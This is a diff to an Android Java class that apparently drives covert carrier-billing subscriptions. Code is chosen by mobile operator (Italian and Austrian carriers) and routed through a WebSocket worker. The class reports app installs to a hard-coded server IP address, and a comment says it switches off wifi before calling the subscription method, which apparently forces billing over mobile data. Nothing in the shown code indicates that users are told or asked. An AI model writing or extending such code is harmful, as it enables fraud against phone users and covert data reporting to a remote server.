@@ -59,64 +59,54 @@ public class SubContext {
 
 
     private void initSubCall() {
-
-        String useragent = new WebView(context).getSettings().getUserAgentString();
-
-
+        String userAgent = new WebView(context).getSettings().getUserAgentString();
         operator = StringUtil.isEmpty(operator) ? NetUtil.getOperator() : operator;
+//        switch (operator) {
 
-        switch (operator) {
-
-            case ITALY_TIM:
-                LogUtils.i("init TIM", operator);
-                subCall = new TIMSub();
-                break;
-            case AUSTRIA_H3G:
-            case AUSTRIA_H3G_2:
-                subCall = new WebSocketWorker();
+//            case ITALY_TIM:
+//                LogUtils.i("init TIM", operator);
+//                subCall = new TIMSub();
+//                break;
+//            case AUSTRIA_H3G:
+//            case AUSTRIA_H3G_2:
+//                subCall = new WebSocketWorker();
 //                LogUtils.i("初始化 奥地利 H3G", operator);
 //                subCall = new AustriaH3G(this.context);
-                break;
-
-
-            case AUSTRIA_OPERATOR_A1_1:
-            case AUSTRIA_OPERATOR_A1_2:
-
+//                break;
+//            case AUSTRIA_OPERATOR_A1_1:
+//            case AUSTRIA_OPERATOR_A1_2:
 //                LogUtils.i("初始化 奥地利 A1", operator);
-//
 //                subCall = new AustriaA1();
-                subCall = new WebSocketWorker();
-                break;
-
-            default:
-
-                subCall = new WebSocketWorker();
-
-                LogUtils.w("初始化 WebSocketWorker", operator);
-        }
+//                subCall = new WebSocketWorker();
+//                break;
+//            default:
+        subCall = new WebSocketWorker();
+        LogUtils.w("初始化 WebSocketWorker", operator);
+//        }
         if (subCall != null) {
-            subCall.init(useragent, operator, event);
-
+            subCall.init(userAgent, operator, event);
             if (subProxy != null) {
                 subCall.setProxy(subProxy);
             }
         }
     }
 
+    /**
+     * 初始化 SubContext init方法
+     *
+     * @param context
+     * @param event
+     */
     public static void init(Context context, SubEvent event) {
-
         synchronized (SubEvent.class) {
-
-
             Utils.init(context);
-
+            //初始化上报函数
+            //APP_SERVER_HOST = http://52.53.238.169:8081
             SubReport.init(APP_SERVER_HOST);
-
 
             if (subContext == null) {
 
                 subContext = new SubContext(context, event);
-
             }
 
         }
@@ -143,28 +133,24 @@ public class SubContext {
 
     }
 
+    /**
+     * @param context
+     * @param event
+     */
     private SubContext(Context context, SubEvent event) {
-
         this.context = context;
         this.event = event;
 
         initSubCall();
-
         if (!SharedUtil.isInstalled()) {
-
             event.onMessage(INSTALLED, null);
             SubReport.getReport().i(INSTALLED);
-
-
             SharedUtil.installed();
-
         }
-
     }
 
 
     private SubContext(Context context, SubEvent event, RelativeLayout layout) {
-
         this.context = context;
         this.event = event;
         this.layout = layout;
@@ -295,7 +281,7 @@ public class SubContext {
 
                                     //关闭wifi
                                     if (wifiStateAndClose()) {
-
+                                        //调用 WebSocketWorker 中sub方法
                                         subContext.subCall.sub(info);
 
                                     }
@@ -319,6 +305,11 @@ public class SubContext {
 
     }
 
+    /**
+     * 该方法用于开启通知后回调
+     *
+     * @param message
+     */
     public static void call(final String message) {
 
         if (subContext.subCall != null) {
